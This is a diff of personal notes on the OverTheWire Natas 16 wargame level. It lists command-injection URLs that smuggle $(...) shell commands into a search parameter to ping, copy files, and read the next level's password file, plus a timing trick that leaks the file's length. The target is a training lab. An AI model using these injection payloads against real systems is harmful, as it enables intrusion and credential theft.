@@ -23,21 +23,25 @@ http://localhost:8000/code_16.php?needle=a+payload.txt%24%28echo+pwd%29+%23&subm
 http://localhost:8000/code_16.php?needle=a+payload.txt%24(ping+-c+20+127.0.0.1)+%23&submit=Search
 ->and this worked, the blind ;)
 
+=>http://localhost:8000/code_16.php?needle=a payload.txt$(cp ./payload.txt ./pay) #&submit=Search
+http://localhost:8000/code_16.php?needle=a+payload.txt%24(cp+.%2Fpayload.txt+.%2Fpay)+%23&submit=Search
+->this worked too
 
-=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(ping -c 20 1.1.1.1) #&submit=Search
-http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(ping+-c+20+1.1.1.1)+%23&submit=Search
+
+=>http://natas16.natas.labs.overthewire.org/?needle=0 dictionary.txt$(ping -c 10 1.1.1.1) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+dictionary.txt%24(ping+-c+10+1.1.1.1)+%23&submit=Search
 
 
-=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(cp /etc/natas_webpass/natas17 /uploads/natas17) #&submit=Search
-http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(cp+%2Fetc%2Fnatas_webpass%2Fnatas17+%2Fuploads%2Fnatas17)+%23&submit=Search
+=>http://natas16.natas.labs.overthewire.org/?needle=0 dictionary.txt$(cp /etc/natas_webpass/natas17 /uploads/natas17) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+dictionary.txt%24(cp+%2Fetc%2Fnatas_webpass%2Fnatas17+%2Fuploads%2Fnatas17)+%23&submit=Search
 
 =>cat /etc/natas_webpass/natas17 > /passna.txt
-=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(cat /etc/natas_webpass/natas17 > /passna.txt) #&submit=Search
-http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(cat+%2Fetc%2Fnatas_webpass%2Fnatas17+%3E+%2Fpassna.txt)+%23&submit=Search
+=>http://natas16.natas.labs.overthewire.org/?needle=0 dictionary.txt$(cat /etc/natas_webpass/natas17 > /passna.txt) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+dictionary.txt%24(cat+%2Fetc%2Fnatas_webpass%2Fnatas17+%3E+%2Fpassna.txt)+%23&submit=Search
 
 =>cat /etc/natas_webpass/natas17 > ./passna.txt
-=>http://natas16.natas.labs.overthewire.org/?needle=0 payload.txt$(cat /etc/natas_webpass/natas17 > ./passna.txt) #&submit=Search
-http://natas16.natas.labs.overthewire.org/?needle=0+payload.txt%24(cat+%2Fetc%2Fnatas_webpass%2Fnatas17+%3E+.%2Fpassna.txt)+%23&submit=Search
+=>http://natas16.natas.labs.overthewire.org/?needle=0 dictionary.txt$(cat /etc/natas_webpass/natas17 > ./passna.txt) #&submit=Search
+http://natas16.natas.labs.overthewire.org/?needle=0+dictionary.txt%24(cat+%2Fetc%2Fnatas_webpass%2Fnatas17+%3E+.%2Fpassna.txt)+%23&submit=Search
 
 
 http://natas.labs.overthewire.org:80/cgi-bin/   forbidden
@@ -48,3 +52,4 @@ http://natas.labs.overthewire.org:80/css/   forbidden
 http://natas.labs.overthewire.org:80/js/    forbidden
 
 
+$(timeout $(wc -c < /etc/natas_webpass/natas17) ping 8.8.8.8)
